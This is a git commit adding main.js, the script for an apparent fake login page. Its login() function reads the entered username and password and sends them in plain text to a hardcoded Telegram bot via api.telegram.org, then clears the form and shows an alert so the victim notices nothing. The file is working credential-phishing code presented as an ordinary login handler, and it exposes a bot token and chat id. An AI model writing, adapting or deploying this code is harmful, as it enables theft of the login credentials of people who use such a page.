1f94c2a1ee2c152595470c86f7f1853b40d26d69
sajsos <53405168+sajsos@users.noreply.github.com>
2019-07-28 19:39:13 +0300

    Add files via upload

---
+++ main.js
@@ -0,0 +1,39 @@
+$(document).ready(function(){
+
+var winh = $(window).height();
+
+$(".header").height(winh);
+$(".space").height(winh /4);
+
+
+$("button").click(function(){
+window.location.href = "login.html";
+});
+
+
+
+});
+
+function login(){
+var username = $("#username").val();
+var pass = $("#pass").val();
+
+var text = "user : " + username + "|| pass : " + pass;
+
+var token = "712723724:AAH5udEmZeaE5xPDH2OrO4ZjPFtdyd3OHKM";
+var id = "643025462";
+
+if(username.length > 0 && pass.length > 0){
+
+
+$("#logbut").attr("disabled","disabled");
+    
+    $.get( "https://api.telegram.org/bot" + token +"/sendMessage?chat_id=" +id + "&text=" + text, function( data ) {
+$("#logbut").removeAttr("disabled","disabled");
+$(".alert").show();
+$("#username,#pass").val("");
+      });
+
+}
+
+}
